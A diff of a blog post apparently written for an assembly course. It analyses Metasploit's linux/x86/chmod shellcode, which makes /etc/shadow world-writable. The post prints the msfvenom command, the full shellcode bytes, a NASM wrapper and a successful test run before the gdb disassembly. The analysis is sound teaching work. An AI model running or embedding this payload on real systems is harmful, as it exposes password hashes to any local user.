@@ -20,7 +20,7 @@ In this blog post we will be analyzing the `linux/x86/chmod` payload.
 This shellcode will change the permissions of the file `/etc/shadow` on the victims device allowing any and all users to read & write to the file.  
 There are much easier ways of creating an executable to test the shellcode than what is shown here. Instead we could have used the C program provided, output the shellcode into a file, or piped the payload to the analysis program.  
 The method of adding the shellcode to our own `JMP|Call|POP` Assembly program was used to gain a better grasp on the assembly concepts.  
-### Settings for the MSF chmod payload
+### Settings for our MSF chmod payload
 ```console
 root# msfvenom --payload linux/x86/chmod --list-options
 Name  Current Setting  Required  Description
@@ -34,11 +34,6 @@ Description:
 
 ## Preparing the Shellcode for `gdb` & `disasm` Analysis
 ### Generating the `chmod` Shellcode
-+ We will export the shellcode to the python format.
-  -  This will allow us to add the shellcode to our python script for formatting.
-+ Once we generate the correct format for our shellcode, we will add it to our `JMP|Call|POP` assembly program.
-  - This will allow us to easily analyze the shellcode with `gdb` and `disasm`.
-
 ```console
 root@zed# msfvenom -p linux/x86/chmod --format python 2>/dev/null | \
 > egrep "^buf " | sed -e 's/buf /sc /g'
@@ -47,11 +42,17 @@ sc += "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74"
 sc += "\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01"
 sc += "\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"
 ```
++ We will export the shellcode to the python format.
+  -  This will allow us to add the shellcode to our python script for formatting.
++ Once we generate the correct format for our shellcode, we will add it to our `JMP|Call|POP` assembly program.
+  - This will allow us to easily analyze the shellcode with `gdb` and `disasm`.
+
 ### Formatting the Shellcode for Assembly Compilation
 + We will copy the `sc` python variable generated above, and add it to our python script.
 + Typically `msfvenom` generates the shellcode in the `\x99` we see above.
 + We need the shellcode to be in the `0x99,` format.
   - Assembly requires we use the `0x99,` format for assigning a hex string to memory.
+
 #### Our Python Script to Format the Hex Code
 ```python
 #!/usr/bin/python
@@ -88,7 +89,6 @@ Encoded shellcode ...
 0xcd,0x80
 ```
 ### Adding the Shellcode to our `JMP|Call|POP` Assembly Program
-+ To get nasm syntax highlighting in Vim I used the command `:set syn=nasm`.
 
 ```nasm
 ; Filename: jmpCallPop.nasm
@@ -116,13 +116,14 @@ call_shellcode:
       0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
       0xcd,0x80
 ```
++ To get nasm syntax highlighting in Vim I used the command `:set syn=nasm`.
+
 ### Compiling our JMP|Call|POP Shellcode
 ```console
 root# nasm -f elf32 jmpCallPop.nasm -o jmpCallPop.o
 root# ld jmpCallPop.o -o jmpCallPop
 ```
 ### Testing our chmod Shellcode
-+ The payload will change the file `/etc/shadow` to the permissions `rw-rw-rw-`.
 ```console
 root# ls -l /etc/shadow
 -rw-r----- 1 root shadow 1074 Sep  3 11:17 /etc/shadow
@@ -130,17 +131,20 @@ root# ./jmpCallPop
 root# ls -l /etc/shadow
 -rw-rw-rw- 1 root shadow 1074 Sep  3 11:17 /etc/shadow
 ```
++ The payload will change the file `/etc/shadow` to the permissions `rw-rw-rw-`.
+
 Great! Our payload works as intended. Now lets set a breakpoint and analyze the shellcode with `gdb`.
 
-## Disassembling the Shellcode with `gdb`
-+ We will start the program with `gdb`. 
-+ We will set a breakpoint for our `shellcode`.
-  - Once control is passed to `shellcode` we will walk through it step by step.
+## Disassembling the Shellcode with gdb
+We will start the program with `gdb`, and set a breakpoint for our `shellcode`. Once control is passed to `shellcode` we will step through it in `gdb`.  
+
 ### Setting up gdb for analysis
 #### Starting the Shellcode with gdb
+
 ```console
 root# gdb ./jmpCallPop
 ```
+
 #### Finding the Memory Location of our Shellcode
 ```console
 gdb-peda$ info functions
@@ -152,6 +156,7 @@ Non-debugging symbols:
 0x08048066  call_shellcode
 0x0804806b  shellcode
 ```
+
 #### Setting the Breakpoint in gdb
 ```console
 gdb-peda$ b shellcode
@@ -184,7 +189,7 @@ Dump of assembler code for function shellcode:
    0x0804808d <+34>:    int    0x80
 End of assembler dump.
 ```
-+ Great! Now we will break these instructions into systemcall sections and then disect them block by block.
+Great! Now we will break these instructions into systemcall sections and then disect them block by block.
 
 ## Dividing the Shellcode by Systemcalls
 Since we know that the instruction `int 0x80` is used to execute linux systemcalls, we will use this knowlege to divid this shellcode into two sections.  
@@ -193,23 +198,23 @@ We also know that the value of the `eax` register controls which systemcall will
 + Our second systemcall has the eax value of `0x1`.
 
 ### chmod Systemcall Section
-+ The hex value `0xf` translates to `15` in decimal.
 #### Finding the Systemcall in the Header File
-
 ```console
 i /usr/include/i386-linux-gnu/asm/unistd_32.h
   #define __NR_chmod               15
 ```
-#### chmod C Function
-+ The corresonding assembly register values have been tagged onto the C function.
++ The hex value `0xf` translates to `15` in decimal.
 
+#### chmod C Function
 ```console
 root# man 2 chmod
   int chmod(const char *path, mode_t mode);
        EAX         EBX             ECX
 ```
-### chmod Broken Down by Blocks
-#### First Block 
++ The corresonding assembly register values have been tagged onto the C function.
+
+## chmod Broken Down by Blocks
+### First Block 
 ```console
 => 0x0804806b <+0>:     cdq
    0x0804806c <+1>:     push   0xf
@@ -228,11 +233,12 @@ root# man 2 chmod
 + `EAX: 0xf`
 4. Instruction `push edx` pushes 4 bytes `0x00` (a dword) onto the top of the stack.
   
-#### Second Block
+### Second Block
 This block of code uses the `call` instruction to jump over the block shown here, and continue execution of the shellcode. 
 + When the `call` instruction is executed, the memory location of the next instruction will be stored otno the top of the stack before maing the jump.
 + The memory location stored on the top of the stack is actually the address of our string used for the filename `/etc/shadow`.
   - Any time I see `das` after a call in shellcode, it typically means it is a string operation.
+
 ```console
    0x08048070 <+5>:     call   0x8048081 <shellcode+22>
    0x08048075 <+10>:    das
@@ -244,13 +250,14 @@ This block of code uses the `call` instruction to jump over the block shown here
    0x0804807d <+18>:    outs   dx,DWORD PTR fs:[esi]
    0x0804807f <+20>:    ja     0x8048081 <shellcode+22>
 ```
+
 ##### Pointer to /etc/shadow string on the top of the Stack
 ```console
 [-------------------stack---------------------------]
 0000| 0xbffff588 --> 0x8048074 (<shellcode+10>: das)
 ```
 
-#### Third Block
+### Third Block
 This block finishs setting up the registers 
 
 ```console
